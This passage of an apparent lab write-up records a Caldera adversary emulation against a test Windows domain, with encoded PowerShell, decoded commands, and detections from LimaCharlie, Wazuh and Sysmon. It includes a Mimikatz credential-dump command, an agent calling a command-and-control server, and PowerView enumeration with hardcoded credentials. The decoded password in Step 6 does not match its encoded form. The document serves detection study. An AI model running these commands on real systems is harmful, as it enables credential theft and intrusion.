+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>Description: Windows PowerShell
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>Product: Microsoft® Windows® Operating System
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>Company: Microsoft Corporation
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>OriginalFileName: PowerShell.EXE
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>CommandLine: powershell.exe -ExecutionPolicy Bypass -C &#34;</span>powershell -Enc SQBtAHAAbwByAHQALQBNAG<span style=color:#bd93f9>8</span>AZAB<span style=color:#bd93f9>1</span>AGwAZQAgAC<span style=color:#bd93f9>4</span>AXABpAG<span style=color:#bd93f9>4</span>AdgBvAGsAZQAtAG<span style=color:#bd93f9>0</span>AaQBtAGkALgBwAHMAMQA<span style=color:#bd93f9>7</span>AEkAbgB<span style=color:#bd93f9>2</span>AG<span style=color:#bd93f9>8</span>AawBlAC<span style=color:#bd93f9>0</span>ATQBpAG<span style=color:#bd93f9>0</span>AaQBrAGEAdAB<span style=color:#bd93f9>6</span>ACAALQBEAHUAbQBwAEMAcgBlAGQAcwA=<span style=color:#f1fa8c>&#34;
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>CurrentDirectory: C:\Windows\system32\
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>User: SSNRSHNN\goadmin
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>LogonId: 0x1225791
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>TerminalSessionId: 1
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>IntegrityLevel: High
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>ParentProcessGuid: {46fa3f9b-8f03-68db-6404-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>ParentProcessId: 8008
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>ParentImage: C:\Users\Public\Client1.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>ParentCommandLine: &#34;</span>C:\Users\Public\Client<span style=color:#bd93f9>1</span>.exe<span style=color:#f1fa8c>&#34; -server http://10.1.4.40:8888 -group red 
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>ParentUser: SSNRSHNN\goadmin&#34;</span>
+</span></span></code></pre></div><h2 id=step-5---remote-host-ping>Step 5 - Remote Host Ping:</h2><p><strong>Base64:</strong></p><pre tabindex=0><code>powershell -Enc cABpAG4AZwAgAGUAeABjAGgAYQBuAGcAZQAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbAA=
+</code></pre><pre tabindex=0><code>powershell -Enc cABpAG4AZwAgAGMAbABpAGUAbgB0ADIALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwA
+</code></pre><pre tabindex=0><code>powershell -Enc cABpAG4AZwAgAGMAbABpAGUAbgB0ADEALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwA
+</code></pre><pre tabindex=0><code>powershell -Enc cABpAG4AZwAgAGEAZAAtAGQAYwAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbAA=
+</code></pre><p><strong>Decoded:</strong></p><pre tabindex=0><code>ping exchange.ssnrshnn.local
+</code></pre><pre tabindex=0><code>ping client2.ssnrshnn.local
+</code></pre><pre tabindex=0><code>ping client1.ssnrshnn.local
+</code></pre><pre tabindex=0><code>ping ad-dc.ssnrshnn.local
+</code></pre><p><strong>Command Output:</strong></p><pre tabindex=0><code>Pinging exchange.ssnrshnn.local [10.1.1.20] with 32 bytes of data:
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+
+Ping statistics for 10.1.1.20:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 1ms, Maximum = 1ms, Average = 1ms
+</code></pre><pre tabindex=0><code>Pinging client2.ssnrshnn.local [10.1.1.20] with 32 bytes of data:
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+
+Ping statistics for 10.1.1.20:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 1ms, Maximum = 1ms, Average = 1ms
+</code></pre><pre tabindex=0><code>Pinging client1.ssnrshnn.local [10.1.1.20] with 32 bytes of data:
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+
+Ping statistics for 10.1.1.20:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 1ms, Maximum = 1ms, Average = 1ms
+</code></pre><pre tabindex=0><code>Pinging ad-dc.ssnrshnn.local [10.1.1.20] with 32 bytes of data:
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+Reply from 10.1.1.20: bytes=32 time=1ms TTL=127
+
+Ping statistics for 10.1.1.20:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 1ms, Maximum = 1ms, Average = 1ms
+</code></pre><p><strong>LimaCharlie:</strong></p><p>I will include the first process&rsquo;s screenshots; the others associated with this step are the same.</p><p><strong>First Process:</strong></p><p><img src=/images/calderaalice/38.png alt=alice></p><p><strong>Process Tree:</strong></p><p><img src=/images/calderaalice/39.png alt=alice></p><p><strong>LimaCharlie Detection:</strong></p><p><strong>First Process:</strong></p><p><img src=/images/calderaalice/46.png alt=alice></p><p><strong>Detection Rules that are matched with relevant processes:</strong></p><ul><li><strong>ext-sigma-7a14fbc3-54d9-4b4d-8700-61eddada04f0</strong></li><li><strong>soteria-rules-edr-926e2197-189b-4d89-9675-c8993933dc9a</strong></li></ul><p><strong>Wazuh Output:</strong></p><p><img src=/images/calderaalice/50.png alt=alice></p><p><img src=/images/calderaalice/51.png alt=alice></p><p><strong>Sysmon Output:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;Process Create:
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>RuleName: -
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>UtcTime: 2025-09-30 09:28:05.393
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>ProcessGuid: {46fa3f9b-a2a5-68db-2105-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>ProcessId: 9952
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>FileVersion: 10.0.19041.3996 (WinBuild.160101.0800)
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>Description: Windows PowerShell
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>Product: Microsoft® Windows® Operating System
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>Company: Microsoft Corporation
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>OriginalFileName: PowerShell.EXE
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>CommandLine: powershell.exe -ExecutionPolicy Bypass -C &#34;</span>powershell -Enc cABpAG<span style=color:#bd93f9>4</span>AZwAgAGUAeABjAGgAYQBuAGcAZQAuAHMAcwBuAHIAcwBoAG<span style=color:#bd93f9>4</span>AbgAuAGwAbwBjAGEAbAA=<span style=color:#f1fa8c>&#34;
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>CurrentDirectory: C:\Windows\system32\
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>User: SSNRSHNN\goadmin
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>LogonId: 0x1225791
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>TerminalSessionId: 1
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>IntegrityLevel: High
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>Hashes: MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>ParentProcessGuid: {46fa3f9b-8f03-68db-6404-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>ParentProcessId: 8008
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>ParentImage: C:\Users\Public\Client1.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>ParentCommandLine: &#34;</span>C:\Users\Public\Client<span style=color:#bd93f9>1</span>.exe<span style=color:#f1fa8c>&#34; -server http://10.1.4.40:8888 -group red 
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>ParentUser: SSNRSHNN\goadmin&#34;</span>
+</span></span></code></pre></div><p><strong>ping.exe</strong></p><p><img src=/images/calderaalice/52.png alt=alice></p><p><img src=/images/calderaalice/53.png alt=alice></p><p><strong>Sysmon Output:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;Process Create:
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>RuleName: -
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>UtcTime: 2025-09-30 09:28:05.734
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>ProcessGuid: {46fa3f9b-a2a5-68db-2305-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>ProcessId: 9976
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>Image: C:\Windows\System32\PING.EXE
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>Description: TCP/IP Ping Command
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>Product: Microsoft® Windows® Operating System
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>Company: Microsoft Corporation
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>OriginalFileName: ping.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>CommandLine: &#34;</span>C:\Windows\system<span style=color:#bd93f9>32</span>\PING.EXE<span style=color:#f1fa8c>&#34; exchange.ssnrshnn.local
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>CurrentDirectory: C:\Windows\system32\
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>User: SSNRSHNN\goadmin
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>LogonGuid: {46fa3f9b-8462-68db-9157-220100000000}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>LogonId: 0x1225791
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>TerminalSessionId: 1
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>IntegrityLevel: High
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>Hashes: MD5=2F46799D79D22AC72C241EC0322B011D,SHA256=7AF50FA112932EA3284F7821B2EEA2B7582F558DBA897231BB82182003C29F8B,IMPHASH=8C3BE1286CDAD6AC1136D0BB6C83FF41
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>ParentProcessGuid: {46fa3f9b-a2a5-68db-2205-000000000900}
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>ParentProcessId: 7088
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>ParentCommandLine: &#34;</span>C:\Windows\System<span style=color:#bd93f9>32</span>\WindowsPowerShell\v<span style=color:#bd93f9>1.0</span>\powershell.exe<span style=color:#f1fa8c>&#34; -Enc cABpAG4AZwAgAGUAeABjAGgAYQBuAGcAZQAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbAA=
+</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>ParentUser: SSNRSHNN\goadmin&#34;</span>
+</span></span></code></pre></div><p>The rest of the alerts in Wazuh are the same apart from the machine names. I will not include them here to avoid clutter.</p><h2 id=step-6---account-type-admin-enumeration>Step 6 - Account-type Admin Enumeration:</h2><p><strong>Base64:</strong></p><pre tabindex=0><code>powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsAJABiAGEAYwBrAHUAcAAgAD0AIAAiAGcAZQB0AF8AYQBkAG0AaQBuACIAOwAkAHUAcwBlAHIATgBhAG0AZQAgAD0AIAAiAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbABcAGcAbwBhAGQAbQBpAG4AIgA7ACQAdQBzAGUAcgBQAGEAcwBzAHcAbwByAGQAIAA9ACAAIgBTAG8AbgBlAHIALgBvADEAIgA7ACQAcwBlAGMAUwB0AHIAaQBuAGcAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHUAcwBlAHIAUABhAHMAcwB3AG8AcgBkACAALQBBAHMAUABsAGEAaQBuAFQAZQB4AHQAIAAtAEYAbwByAGMAZQA7ACQAYwByAGUAZABPAGIAagBlAGMAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAKAAkAHUAcwBlAHIATgBhAG0AZQAsACAAJABzAGUAYwBTAHQAcgBpAG4AZwBQAGEAcwBzAHcAbwByAGQAKQA7AEcAZQB0AC0ATgBlAHQATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgAgAC0AQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABlAHgAYwBoAGEAbgBnAGUALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwAIAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAkAGMAcgBlAGQATwBiAGoAZQBjAHQA
+</code></pre><pre tabindex=0><code>powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsAJABiAGEAYwBrAHUAcAAgAD0AIAAiAGcAZQB0AF8AYQBkAG0AaQBuACIAOwAkAHUAcwBlAHIATgBhAG0AZQAgAD0AIAAiAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbABcAGcAbwBhAGQAbQBpAG4AIgA7ACQAdQBzAGUAcgBQAGEAcwBzAHcAbwByAGQAIAA9ACAAIgBTAG8AbgBlAHIALgBvADEAIgA7ACQAcwBlAGMAUwB0AHIAaQBuAGcAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHUAcwBlAHIAUABhAHMAcwB3AG8AcgBkACAALQBBAHMAUABsAGEAaQBuAFQAZQB4AHQAIAAtAEYAbwByAGMAZQA7ACQAYwByAGUAZABPAGIAagBlAGMAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAKAAkAHUAcwBlAHIATgBhAG0AZQAsACAAJABzAGUAYwBTAHQAcgBpAG4AZwBQAGEAcwBzAHcAbwByAGQAKQA7AEcAZQB0AC0ATgBlAHQATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgAgAC0AQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABjAGwAaQBlAG4AdAAyAC4AcwBzAG4AcgBzAGgAbgBuAC4AbABvAGMAYQBsACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJABjAHIAZQBkAE8AYgBqAGUAYwB0AA==
+</code></pre><pre tabindex=0><code>powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsAJABiAGEAYwBrAHUAcAAgAD0AIAAiAGcAZQB0AF8AYQBkAG0AaQBuACIAOwAkAHUAcwBlAHIATgBhAG0AZQAgAD0AIAAiAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbABcAGcAbwBhAGQAbQBpAG4AIgA7ACQAdQBzAGUAcgBQAGEAcwBzAHcAbwByAGQAIAA9ACAAIgBTAG8AbgBlAHIALgBvADEAIgA7ACQAcwBlAGMAUwB0AHIAaQBuAGcAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHUAcwBlAHIAUABhAHMAcwB3AG8AcgBkACAALQBBAHMAUABsAGEAaQBuAFQAZQB4AHQAIAAtAEYAbwByAGMAZQA7ACQAYwByAGUAZABPAGIAagBlAGMAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAKAAkAHUAcwBlAHIATgBhAG0AZQAsACAAJABzAGUAYwBTAHQAcgBpAG4AZwBQAGEAcwBzAHcAbwByAGQAKQA7AEcAZQB0AC0ATgBlAHQATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgAgAC0AQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABjAGwAaQBlAG4AdAAxAC4AcwBzAG4AcgBzAGgAbgBuAC4AbABvAGMAYQBsACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJABjAHIAZQBkAE8AYgBqAGUAYwB0AA==
+</code></pre><pre tabindex=0><code>powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsAJABiAGEAYwBrAHUAcAAgAD0AIAAiAGcAZQB0AF8AYQBkAG0AaQBuACIAOwAkAHUAcwBlAHIATgBhAG0AZQAgAD0AIAAiAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbABcAGcAbwBhAGQAbQBpAG4AIgA7ACQAdQBzAGUAcgBQAGEAcwBzAHcAbwByAGQAIAA9ACAAIgBTAG8AbgBlAHIALgBvADEAIgA7ACQAcwBlAGMAUwB0AHIAaQBuAGcAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHUAcwBlAHIAUABhAHMAcwB3AG8AcgBkACAALQBBAHMAUABsAGEAaQBuAFQAZQB4AHQAIAAtAEYAbwByAGMAZQA7ACQAYwByAGUAZABPAGIAagBlAGMAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAKAAkAHUAcwBlAHIATgBhAG0AZQAsACAAJABzAGUAYwBTAHQAcgBpAG4AZwBQAGEAcwBzAHcAbwByAGQAKQA7AEcAZQB0AC0ATgBlAHQATABvAGMAYQBsAEcAcgBvAHUAcABNAGUAbQBiAGUAcgAgAC0AQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIABhAGQALQBkAGMALgBzAHMAbgByAHMAaABuAG4ALgBsAG8AYwBhAGwAIAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAkAGMAcgBlAGQATwBiAGoAZQBjAHQA
+</code></pre><p><strong>Decoded:</strong></p><pre tabindex=0><code>Import-Module .\powerview.ps1;$backup = &#34;get_admin&#34;;$userName = &#34;ssnrshnn.local\goadmin&#34;;$secStringPassword = ConvertTo-SecureString &#34;Test123!&#34; -AsPlainText -Force;$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);Get-NetLocalGroupMember -ComputerName exchange.ssnrshnn.local -Credential $credObject
